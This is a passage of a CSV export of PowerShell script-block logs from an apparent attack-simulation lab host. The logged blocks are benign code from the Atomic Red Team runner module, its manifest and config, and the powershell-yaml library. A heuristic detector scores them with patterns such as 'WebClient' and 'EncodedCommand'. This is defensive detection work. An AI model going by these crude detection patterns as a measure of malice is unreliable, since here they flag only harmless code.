Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:56 PM","35710900","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","1039","function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {
    $success = $false
    $null = @(
        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null
        $ms = New-Object IO.MemoryStream
        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $actualHash = (Get-FileHash -InputStream $ms).Hash
        if ( $hash -eq $actualHash) {
            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)
            $ms.CopyTo($fileStream);
            $fileStream.Close()
            $success = $true
        }
        else {
            Write-Host -ForegroundColor red ""File hash mismatch, expected: $hash, actual: $actualHash""
        }
    )
    $success
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35711001","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","3535","@{

    # Script module or binary module file associated with this manifest.
    RootModule        = 'Invoke-AtomicRedTeam.psm1'

    # Version number of this module.
    ModuleVersion     = '2.1.0'

    # ID used to uniquely identify this module
    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'

    # Author of this module
    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'

    # Company or vendor of this module
    CompanyName       = 'Red Canary, Inc.'

    # Copyright statement for this module
    Copyright         = '(c) 2021 Red Canary. All rights reserved.'

    # Description of the functionality provided by this module
    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'

    # Minimum version of the Windows PowerShell engine required by this module
    PowerShellVersion = '5.0'

    # Modules that must be imported into the global environment prior to importing this module
    RequiredModules   = @('powershell-yaml')

    # Script files (.ps1) that are run in the caller's environment prior to importing this module.
    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.
    ScriptsToProcess  = @('Private\AtomicClassSchema.ps1', 'Public\config.ps1')

    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
    FunctionsToExport = @(
        'Invoke-AtomicTest',
        'Get-AtomicTechnique',
        'New-AtomicTechnique',
        'New-AtomicTest',
        'New-AtomicTestInputArgument',
        'New-AtomicTestDependency',
        'Start-AtomicGUI',
        'Stop-AtomicGUI',
        'Invoke-SetupAtomicRunner',
        'Invoke-GenerateNewSchedule',
        'Invoke-RefreshExistingSchedule',
        'Invoke-AtomicRunner',
        'Get-Schedule',
        'Invoke-KickoffAtomicRunner',
        'Get-PreferredIPAddress',
        'Invoke-KillProcessTree'
    )

    # Variables to export from this module
    VariablesToExport = '*'

    NestedModules     = @(
        ""Public\Default-ExecutionLogger.psm1"",
        ""Public\Attire-ExecutionLogger.psm1"",
        ""Public\Syslog-ExecutionLogger.psm1"",
        ""Public\WinEvent-ExecutionLogger.psm1""
    )

    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
    PrivateData       = @{

        PSData = @{

            # Tags applied to this module. These help with module discovery in online galleries.
            Tags         = @('Security', 'Defense')

            # A URL to the license for this module.
            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'

            # A URL to the main website for this project.
            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'

            # A URL to an icon representing this module.
            # IconUri = ''

            # ReleaseNotes of this module
            ReleaseNotes = @'
1.0.2
-----
* Add support for custom execution loggers

1.0.1
-----
* Adding 'powershell-yaml' to RequiredModules in the module manifest

1.0.0
-----
* Initial release for submission to the PowerShell Gallery
'@

        } # End of PSData hashtable

    } # End of PrivateData hashtable
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:54 PM","35710623","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","3535","@{

    # Script module or binary module file associated with this manifest.
    RootModule        = 'Invoke-AtomicRedTeam.psm1'

    # Version number of this module.
    ModuleVersion     = '2.1.0'

    # ID used to uniquely identify this module
    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'

    # Author of this module
    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'

    # Company or vendor of this module
    CompanyName       = 'Red Canary, Inc.'

    # Copyright statement for this module
    Copyright         = '(c) 2021 Red Canary. All rights reserved.'

    # Description of the functionality provided by this module
    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'

    # Minimum version of the Windows PowerShell engine required by this module
    PowerShellVersion = '5.0'

    # Modules that must be imported into the global environment prior to importing this module
    RequiredModules   = @('powershell-yaml')

    # Script files (.ps1) that are run in the caller's environment prior to importing this module.
    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.
    ScriptsToProcess  = @('Private\AtomicClassSchema.ps1', 'Public\config.ps1')

    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
    FunctionsToExport = @(
        'Invoke-AtomicTest',
        'Get-AtomicTechnique',
        'New-AtomicTechnique',
        'New-AtomicTest',
        'New-AtomicTestInputArgument',
        'New-AtomicTestDependency',
        'Start-AtomicGUI',
        'Stop-AtomicGUI',
        'Invoke-SetupAtomicRunner',
        'Invoke-GenerateNewSchedule',
        'Invoke-RefreshExistingSchedule',
        'Invoke-AtomicRunner',
        'Get-Schedule',
        'Invoke-KickoffAtomicRunner',
        'Get-PreferredIPAddress',
        'Invoke-KillProcessTree'
    )

    # Variables to export from this module
    VariablesToExport = '*'

    NestedModules     = @(
        ""Public\Default-ExecutionLogger.psm1"",
        ""Public\Attire-ExecutionLogger.psm1"",
        ""Public\Syslog-ExecutionLogger.psm1"",
        ""Public\WinEvent-ExecutionLogger.psm1""
    )

    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
    PrivateData       = @{

        PSData = @{

            # Tags applied to this module. These help with module discovery in online galleries.
            Tags         = @('Security', 'Defense')

            # A URL to the license for this module.
            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'

            # A URL to the main website for this project.
            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'

            # A URL to an icon representing this module.
            # IconUri = ''

            # ReleaseNotes of this module
            ReleaseNotes = @'
1.0.2
-----
* Add support for custom execution loggers

1.0.1
-----
* Adding 'powershell-yaml' to RequiredModules in the module manifest

1.0.0
-----
* Initial release for submission to the PowerShell Gallery
'@

        } # End of PSData hashtable

    } # End of PrivateData hashtable
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:55 PM","35710814","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","3535","@{

    # Script module or binary module file associated with this manifest.
    RootModule        = 'Invoke-AtomicRedTeam.psm1'

    # Version number of this module.
    ModuleVersion     = '2.1.0'

    # ID used to uniquely identify this module
    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'

    # Author of this module
    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'

    # Company or vendor of this module
    CompanyName       = 'Red Canary, Inc.'

    # Copyright statement for this module
    Copyright         = '(c) 2021 Red Canary. All rights reserved.'

    # Description of the functionality provided by this module
    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'

    # Minimum version of the Windows PowerShell engine required by this module
    PowerShellVersion = '5.0'

    # Modules that must be imported into the global environment prior to importing this module
    RequiredModules   = @('powershell-yaml')

    # Script files (.ps1) that are run in the caller's environment prior to importing this module.
    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.
    ScriptsToProcess  = @('Private\AtomicClassSchema.ps1', 'Public\config.ps1')

    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
    FunctionsToExport = @(
        'Invoke-AtomicTest',
        'Get-AtomicTechnique',
        'New-AtomicTechnique',
        'New-AtomicTest',
        'New-AtomicTestInputArgument',
        'New-AtomicTestDependency',
        'Start-AtomicGUI',
        'Stop-AtomicGUI',
        'Invoke-SetupAtomicRunner',
        'Invoke-GenerateNewSchedule',
        'Invoke-RefreshExistingSchedule',
        'Invoke-AtomicRunner',
        'Get-Schedule',
        'Invoke-KickoffAtomicRunner',
        'Get-PreferredIPAddress',
        'Invoke-KillProcessTree'
    )

    # Variables to export from this module
    VariablesToExport = '*'

    NestedModules     = @(
        ""Public\Default-ExecutionLogger.psm1"",
        ""Public\Attire-ExecutionLogger.psm1"",
        ""Public\Syslog-ExecutionLogger.psm1"",
        ""Public\WinEvent-ExecutionLogger.psm1""
    )

    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
    PrivateData       = @{

        PSData = @{

            # Tags applied to this module. These help with module discovery in online galleries.
            Tags         = @('Security', 'Defense')

            # A URL to the license for this module.
            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'

            # A URL to the main website for this project.
            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'

            # A URL to an icon representing this module.
            # IconUri = ''

            # ReleaseNotes of this module
            ReleaseNotes = @'
1.0.2
-----
* Add support for custom execution loggers

1.0.1
-----
* Adding 'powershell-yaml' to RequiredModules in the module manifest

1.0.0
-----
* Initial release for submission to the PowerShell Gallery
'@

        } # End of PSData hashtable

    } # End of PrivateData hashtable
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:56 PM","35710873","6",", EncodedCommand, SuspiciousCmdlet, Get","EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]","431","function Get-PreferredIPAddress($isWindows) {
    if ($isWindows) {
        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne ""WellKnown"" }).IPAddress
    }
    elseif ($IsMacOS) {
        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr
    }
    elseif ($IsLinux) {
        return ip -4 -br addr show | sed -n -e 's/^.*UP\s* //p' | cut -d ""/"" -f 1
    }
    else {
        return ''
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e ''
Pattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
"12/16/2024 8:34:55 PM","35710833","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","16921","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

enum SerializationOptions {
    None = 0
    Roundtrip = 1
    DisableAliases = 2
    EmitDefaults = 4
    JsonCompatible = 8
    DefaultToStaticType = 16
    WithIndentedSequences = 32
}
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$assemblies = Join-Path $here ""Load-Assemblies.ps1""
$infinityRegex = [regex]::new('^[-+]?(\.inf|\.Inf|\.INF)$', ""Compiled, CultureInvariant"");

if (Test-Path $assemblies) {
    . $here\Load-Assemblies.ps1
}

function Get-YamlDocuments {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$Yaml,
        [switch]$UseMergingParser=$false
    )
    PROCESS {
        $stringReader = new-object System.IO.StringReader($Yaml)
        $parser = New-Object ""YamlDotNet.Core.Parser"" $stringReader
        if($UseMergingParser) {
            $parser = New-Object ""YamlDotNet.Core.MergingParser"" $parser
        }

        $yamlStream = New-Object ""YamlDotNet.RepresentationModel.YamlStream""
        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)

        $stringReader.Close()

        return $yamlStream
    }
}

function Convert-ValueToProperType {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Object]$Node
    )
    PROCESS {
        if (!($Node.Value -is [string])) {
            return $Node
        }
        
        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {
            switch($Node.Tag) {
                ""tag:yaml.org,2002:str"" {
                    return $Node.Value
                }
                ""tag:yaml.org,2002:null"" {
                    return $null
                }
                ""tag:yaml.org,2002:bool"" {
                    $parsedValue = $false
                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as boolean"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:int"" {
                    $parsedValue = 0
                    if ($node.Value.Length -gt 2) {
                        switch ($node.Value.Substring(0, 2)) {
                            ""0o"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)
                            }
                            ""0x"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)
                            }
                            default {
                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                                    Throw (""failed to parse scalar {0} as long"" -f $Node)
                                }
                            }
                        }
                    } else {
                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                            Throw (""failed to parse scalar {0} as long"" -f $Node)
                        }
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:float"" {
                    $parsedValue = 0.0
                    if ($infinityRegex.Matches($Node.Value)) {
                        $prefix = $Node.Value.Substring(0, 1)
                        switch ($prefix) {
                            ""-"" {
                                return [double]::NegativeInfinity
                            }
                            default {
                                # Prefix is either missing or is a +
                                return [double]::PositiveInfinity
                            }
                        }
                    }
                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as double"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:timestamp"" {
                    # From the YAML spec: http://yaml.org/type/timestamp.html
                    [DateTime]$parsedValue = [DateTime]::MinValue
                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)
                    $tss = $ts.ToString(""o"")
                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {
                        Throw (""failed to parse scalar {0} as DateTime"" -f $Node)
                    }
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain')
        {
            $types = @([int], [long], [double], [boolean], [decimal])
            foreach($i in $types){
                $parsedValue = New-Object -TypeName $i.FullName
                if ($i.IsAssignableFrom([boolean])){
                    $result = $i::TryParse($Node,[ref]$parsedValue) 
                } else {
                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)
                }
                if( $result ) {
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {
            return $null
        }

        return $Node.Value
    }
}

function Convert-YamlMappingToHashtable {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,
        [switch] $Ordered
    )
    PROCESS {
        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }
        foreach($i in $Node.Children.Keys) {
            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered
        }
        return $ret
    }
}

function Convert-YamlSequenceToArray {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,
        [switch]$Ordered
    )
    PROCESS {
        $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
        foreach($i in $Node.Children){
            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))
        }
        return ,$ret
    }
}

function Convert-YamlDocumentToPSObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [System.Object]$Node, 
        [switch]$Ordered
    )
    PROCESS {
        switch($Node.GetType().FullName){
            ""YamlDotNet.RepresentationModel.YamlMappingNode""{
                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlSequenceNode"" {
                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlScalarNode"" {
                return (Convert-ValueToProperType $Node)
            }
        }
    }
}

function Convert-HashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [hashtable]$Data
    )
    foreach($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-OrderedHashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Collections.Specialized.OrderedDictionary] $Data
    )
    foreach ($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-ListToGenericList {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [array]$Data=@()
    )
    $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    for($i=0; $i -lt $Data.Count; $i++) {
        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))
    }
    return ,$ret
}

function Convert-PSCustomObjectToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [PSCustomObject]$Data
    )
    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')
    foreach ($i in $Data.psobject.properties) {
        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value
    }
    return $ret
}

function Convert-PSObjectToGenericObject {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [System.Object]$Data
    )

    if ($null -eq $data) {
        return $data
    }

    $dataType = $data.GetType()
    if ($data -isnot [System.Object]) {
        return $data -as $dataType
    }

    if ($dataType.FullName -eq ""System.Management.Automation.PSCustomObject"") {
        return Convert-PSCustomObjectToDictionary $data
    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){
        return Convert-OrderedHashtableToDictionary $data
    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){
        return Convert-HashtableToDictionary $data
    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {
        return Convert-ListToGenericList $data
    }
    return $data -as $dataType
}

function ConvertFrom-Yaml {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]
        [string]$Yaml,
        [switch]$AllDocuments=$false,
        [switch]$Ordered,
        [switch]$UseMergingParser=$false
    )

    BEGIN {
        $d = """"
    }
    PROCESS {
        if($Yaml -is [string]) {
            $d += $Yaml + ""`n""
        }
    }

    END {
        if($d -eq """"){
            return
        }
        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser
        if (!$documents.Count) {
            return
        }
        if($documents.Count -eq 1){
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        if(!$AllDocuments) {
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        $ret = @()
        foreach($i in $documents) {
            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered
        }
        return $ret
    }
}

$stringQuotingEmitterSource = @""
using System;
using System.Text.RegularExpressions;
using YamlDotNet;
using YamlDotNet.Core;
using YamlDotNet.Serialization;
using YamlDotNet.Serialization.EventEmitters;
public class StringQuotingEmitter: ChainedEventEmitter {
    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356
    private static Regex quotedRegex = new Regex(@`""^(\~|null|true|false|on|off|yes|no|y|n|[-+]?(\.[0-9]+|[0-9]+(\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\.inf))?$`"", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    public StringQuotingEmitter(IEventEmitter next): base(next) {}

    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {
        var typeCode = eventInfo.Source.Value != null
        ? Type.GetTypeCode(eventInfo.Source.Type)
        : TypeCode.Empty;

        switch (typeCode) {
            case TypeCode.Char:
                if (Char.IsDigit((char)eventInfo.Source.Value)) {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                }
                break;
            case TypeCode.String:
                var val = eventInfo.Source.Value.ToString();
                if (quotedRegex.IsMatch(val))
                {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                } else if (val.IndexOf('\n') > -1) {
                    eventInfo.Style = ScalarStyle.Literal;
                }
                break;
        }

        base.Emit(eventInfo, emitter);
    }

    public static SerializerBuilder Add(SerializerBuilder builder) {
        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));
    }
}
""@

if (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {
    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)
    if ($PSVersionTable.PSEdition -eq ""Core"") {
        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions ""-nowarn:1701""
    } else {
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp
    }
}

function Get-Serializer {
    Param(
        [Parameter(Mandatory=$true)][SerializationOptions]$Options
    )
    
    $builder = New-Object ""YamlDotNet.Serialization.SerializerBuilder""
    
    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {
        $builder = $builder.EnsureRoundtrip()
    }
    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {
        $builder = $builder.DisableAliases()
    }
    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {
        $builder = $builder.EmitDefaults()
    }
    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {
        $builder = $builder.JsonCompatible()
    }
    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {
        $builder = $builder.WithTypeResolver((New-Object ""YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver""))
    }
    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {
        $builder = $builder.WithIndentedSequences()
    }
    $builder = [StringQuotingEmitter]::Add($builder)
    return $builder.Build()
}

function ConvertTo-Yaml {
    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]
    Param(
        [Parameter(ValueFromPipeline = $true, Position=0)]
        [System.Object]$Data,

        [string]$OutFile,

        [Parameter(ParameterSetName = 'Options')]
        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,

        [Parameter(ParameterSetName = 'NoOptions')]
        [switch]$JsonCompatible,
        
        [switch]$KeepArray,

        [switch]$Force
    )
    BEGIN {
        $d = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    }
    PROCESS {
        if($data -is [System.Object]) {
            $d.Add($data)
        }
    }
    END {
        if ($d -eq $null -or $d.Count -eq 0) {
            return
        }
        if ($d.Count -eq 1 -and !($KeepArray)) {
            $d = $d[0]
        }
        $norm = Convert-PSObjectToGenericObject $d
        if ($OutFile) {
            $parent = Split-Path $OutFile
            if (!(Test-Path $parent)) {
                Throw ""Parent folder for specified path does not exist""
            }
            if ((Test-Path $OutFile) -and !$Force) {
                Throw ""Target file already exists. Use -Force to overwrite.""
            }
            $wrt = New-Object ""System.IO.StreamWriter"" $OutFile
        } else {
            $wrt = New-Object ""System.IO.StringWriter""
        }
    
        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {
            $Options = 0
            if ($JsonCompatible) {
                # No indent options :~(
                $Options = [SerializationOptions]::JsonCompatible
            }
        }

        try {
            $serializer = Get-Serializer $Options
            $serializer.Serialize($wrt, $norm)
        }
        catch{
            $_
        }
        finally {
            $wrt.Close()
        }
        if ($OutFile) {
            return
        } else {
            return $wrt.ToString()
        }
    }
}

New-Alias -Name cfy -Value ConvertFrom-Yaml
New-Alias -Name cty -Value ConvertTo-Yaml

Export-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:57 PM","35711035","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","5396","
$artConfig = [PSCustomObject]@{

  # [optional] These two configs are calculated programatically, you probably don't need to change them
  basehostname               = $((hostname | Select-String -Pattern ""(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$"").Matches.Groups[1].value)
  OS                         = $( if ($IsLinux) { ""linux"" } elseif ($IsMacOS) { ""macos"" } else { ""windows"" })

  # [optional(if using default install paths)] Paths to your Atomic Red Team ""atomics"" folder and your ""invoke-atomicredteam"" folder
  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""/AtomicRedTeam/invoke-atomicredteam"" # this is the default install path so you probably don't need to change this
  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""AtomicRedTeam/atomics"" # this is the default install path so you probably don't need to change this
  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })   ""PrivateAtomics/atomics"" # if you aren't providing your own private atomics that are custom written by you, just leave this as is

  # [ Optional ] The user that will be running each atomic test
  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { ""$env:USERDOMAIN\$env:USERNAME"" }) # example ""corp\atomicrunner""

  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory
  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example ""C:\Users\atomicrunner""

  # [optional]
  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete
  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner
  scheduleFileName           = ""AtomicRunnerSchedule.csv""

  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger
  LoggingModule              = ''

  # [optional] Syslog configuration, default execution logs will be sent to this server:port
  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\)
  syslogPort                 = 514
  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS

  verbose                    = $true; # set to true for more log output

  # [optional] logfile filename configs
  logFolder                  = ""AtomicRunner-Logs""
  timeLocal                  = (Get-Date(get-date) -uformat ""%Y-%m-%d"").ToString()
  logFileName                = ""$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv""

  # amsi bypass script block (applies to Windows only)
  absb                       = $null

  # AtomicRunnerService install directory
  ServiceInstallDir                 = ""${ENV:windir}\System32""

}

# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values
$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
$pathToPrivateConfig = Join-Path $root ""privateConfig.ps1""
if (Test-Path ($pathToPrivateConfig)) {
  if ($IsLinux -or $IsMacOS) {
    chmod +x $pathToPrivateConfig
  }
  & ($pathToPrivateConfig)
}

#####################################################################################
# All of the configs below are calculated using the script block in the ""Value"" field.
# This way, when you change the 'basePath' everything else is updated.
# You should probably leave all of the stuff below alone.
#####################################################################################

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""runnerFolder""
  Value       = { Join-Path $artConfig.basePath ""AtomicRunner"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""atomicLogsPath""
  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""scheduleFile""
  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""credFile""
  Value       = { Join-Path $artConfig.runnerFolder ""psc_$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
